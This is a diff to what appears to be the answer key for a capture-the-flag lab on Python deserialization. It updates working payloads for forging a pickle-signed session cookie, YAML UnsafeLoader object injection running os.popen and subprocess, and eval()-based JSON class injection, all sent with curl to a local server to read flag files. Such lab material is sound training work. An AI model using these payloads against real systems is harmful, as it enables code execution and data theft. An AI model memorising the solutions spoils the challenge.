@@ -39,10 +39,14 @@ Flag: FLAG{d3s3r14l_c00k1e_f0rg3}
   python3 -c "
   import pickle, base64, hmac, hashlib
   session = {'username': 'admin', 'role': 'admin'}
-  data = base64.b64encode(pickle.dumps(session)).decode()
-  sig = hmac.new(b'secret', data.encode(), hashlib.sha256).hexdigest()
-  print(f'{data}.{sig}')
+  raw = pickle.dumps(session)
+  b64 = base64.b64encode(raw).decode()
+  sig = hmac.new(b'secret', raw, hashlib.sha256).hexdigest()
+  print(f'{b64}.{sig}')
   "
+
+  NOTE: The HMAC is computed on the raw pickle bytes (not the base64
+  string). This matches how sign_cookie() works in app.py.
 
   Step 3: Set the forged cookie and visit dashboard:
   curl -b "session_data=<FORGED_COOKIE>" http://localhost:5014/dashboard
@@ -54,44 +58,39 @@ Flag: FLAG{d3s3r14l_c00k1e_f0rg3}
 CHALLENGE 3: YAML Object Injection
 Flag: FLAG{d3s3r14l_y4ml_0bj}
 
-  The /api/restore endpoint uses yaml.load() with UnsafeLoader.
-  Send a YAML payload that instantiates a Python object:
+  The /api/restore endpoint reads form field "data" and passes it to
+  yaml.load() with UnsafeLoader. Send a YAML payload via form encoding:
 
   curl -X POST http://localhost:5014/api/restore \
-    -H "Content-Type: text/yaml" \
-    -d '!!python/object/apply:subprocess.check_output
-  args:
-    - ["cat", "/app/flag3.txt"]'
+    --data-urlencode 'data=!!python/object/apply:subprocess.check_output [["cat", "/app/flag3.txt"]]'
 
   Alternative payload:
   curl -X POST http://localhost:5014/api/restore \
-    -H "Content-Type: text/yaml" \
-    -d '!!python/object/apply:os.popen ["cat /app/flag3.txt"]'
+    --data-urlencode 'data=!!python/object/apply:os.popen ["cat /app/flag3.txt"]'
 
-  The YAML unsafe loader instantiates the Python object during parsing.
+  NOTE: The endpoint uses request.form.get('data'), so data must be
+  sent as a form field (not raw body with Content-Type headers).
 
 -------------------------------------------------------------------------------
 
 CHALLENGE 4: Custom Deserializer — eval() Injection
 Flag: FLAG{d3s3r14l_0bj_1nj3ct}
 
-  The /import-data endpoint accepts JSON with a __class__ field.
-  The custom deserializer calls eval(cls)(*args) and optionally
-  calls a method on the result.
+  The /import-data endpoint reads form field "data" containing JSON
+  with a __class__ field. The custom deserializer calls eval(cls)(*args)
+  and optionally calls a method on the result.
 
   curl -X POST http://localhost:5014/import-data \
-    -H "Content-Type: application/json" \
-    -d '{"__class__": "open", "args": ["/app/flag4.txt"], "method": "read"}'
+    --data-urlencode 'data={"__class__": "open", "args": ["/app/flag4.txt"], "method": "read"}'
 
   This evaluates: open("/app/flag4.txt").read() → returns the flag.
 
   Alternative (direct command execution):
   curl -X POST http://localhost:5014/import-data \
-    -H "Content-Type: application/json" \
-    -d '{"__class__": "os.popen", "args": ["cat /app/flag4.txt"], "method": "read"}'
+    --data-urlencode 'data={"__class__": "os.popen", "args": ["cat /app/flag4.txt"], "method": "read"}'
 
-  Note: "os.popen" may need "import os" first — check if the eval
-  context has os imported.
+  NOTE: The endpoint uses request.form.get('data'), so JSON must be
+  sent as a form field value (not as a raw JSON body).
 
 -------------------------------------------------------------------------------
 
